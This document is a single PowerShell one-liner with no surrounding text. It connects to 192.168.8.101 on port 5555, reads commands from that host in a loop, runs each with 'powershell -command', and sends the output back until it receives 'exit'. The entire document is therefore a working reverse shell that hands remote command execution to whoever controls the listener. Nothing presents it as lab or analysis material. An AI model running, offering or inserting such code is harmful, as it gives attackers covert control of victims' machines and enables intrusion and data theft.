$server = "192.168.8.101"; $port = 5555; $ip = [system.net.ipaddress]::parse($server); $socket = new-object system.net.sockets.tcpclient($ip,$port); $stream = $socket.getstream(); $stringup = "hello"; $stringdown = ""; $writer = new-object system.io.streamwriter($stream); $writer.writeline($stringup); $writer.flush(); $stringup = ""; for($i=0;$stringdown -ne "exit";$i=$i){$writer = new-object system.io.streamwriter($stream); if($stringup -ne ""){foreach ($line in $stringup){$writer.writeline($line); $writer.flush()}}; $stringup = ""; $stringdown = ""; $reader = new-object system.io.streamreader($stream); while ($reader.peek() -ge 0){$result = $reader.read(); $stringdown += [char]$result}; if($stringdown -ne ""){$stringup = powershell -command $stringdown}; sleep(1)}; $stream.dispose(); $stream.close(); $socket.stop()